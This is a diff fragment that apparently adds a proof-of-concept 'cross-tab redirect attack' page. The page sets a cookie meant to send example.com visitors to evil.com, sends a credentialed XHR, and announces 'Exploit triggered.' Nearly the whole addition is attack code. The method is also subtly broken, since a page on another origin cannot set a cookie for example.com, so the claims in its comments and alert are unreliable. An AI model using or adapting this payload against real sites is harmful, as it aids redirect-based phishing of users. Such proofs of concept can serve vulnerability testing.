@@ -22,3 +22,28 @@
   <p>If this page is vulnerable, you will be redirected to <code>https://evil.com</code>.</p>
 </body>
 </html>
+
+<!-- evil-redirector.html (opened in 2nd tab) -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Cross-tab Redirect Attack</title>
+  <script>
+    // Step 1: Set cookie for example.com
+    document.cookie = "redirect=https://evil.com; path=/; domain=example.com";
+
+    // Step 2: Use XHR to "poke" example.com and trigger JS if necessary
+    // (Not always required — mainly here to simulate activity)
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://example.com", true);
+    xhr.withCredentials = true;
+    xhr.send();
+
+    alert("Exploit triggered. Switch to the example.com tab to see redirect.");
+  </script>
+</head>
+<body>
+  <h2>Exploit Running</h2>
+  <p>Cookie set to redirect example.com to evil.com.</p>
+</body>
+</html>
